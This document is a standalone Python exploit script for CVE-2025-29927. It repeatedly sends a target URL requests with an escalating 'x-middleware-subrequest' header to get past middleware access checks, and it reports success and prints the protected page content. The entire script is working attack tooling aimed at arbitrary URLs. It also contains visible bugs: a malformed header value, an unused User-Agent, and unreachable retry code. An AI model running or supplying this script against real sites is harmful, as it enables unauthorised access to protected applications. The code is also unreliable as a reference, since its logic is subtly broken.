import requests
import sys

def requestr(url: str, header_name="x-middleware-subrequest", header_value="middleware", timeout=10):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }

    exploit_header=header_name + ": " + header_value

    try:
        response = requests.get(url, timeout=timeout, allow_redirects=False)
        if response.status_code == 200:
            return "URL is accessible"
        else:
            for attempt in range(8):  # 0-7, so 8 attempts total (initial + 7 retries)
                headers = {header_name: exploit_header}
                
                try:
                    response = requests.get(url, headers=headers, timeout=timeout, allow_redirects=False)
                    
                    if response.status_code == 200:
                        print(f"Successfully exploited CVE-2025-29927 on {url} with header value: {exploit_header}! Status code: {response.status_code} (attempt {attempt + 1})")
                        return response.text
                    else:
                        if attempt < 7:
                            exploit_header = f"{exploit_header}:{header_value}"
                        else:
                            return None
                
                except requests.exceptions.RequestException as e:
                    error_msg=f"Request error on attempt {attempt + 1}: {e}"
                    return error_msg
                    if attempt < 7:
                        exploit_header = f"{exploit_header}:{header_value}"
                        
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None
    
    print("All attempts failed. Returning None.")
    return None


def main():

    if len(sys.argv) < 2:
        print("Error: URL argument is required.")
        print("Usage: python CVE-2025-29927.py {url}")
        sys.exit(1)
    
    url = sys.argv[1]
    print(f"Target URL: {url}")
    print("Starting CVE-2025-29927 exploitation attempt...\n")
    
    result = requestr(url)
    
    if result:
        print(f"\nResult: {result}")
    else:
        print("\nExploitation failed.")


if __name__ == "__main__":
    main()
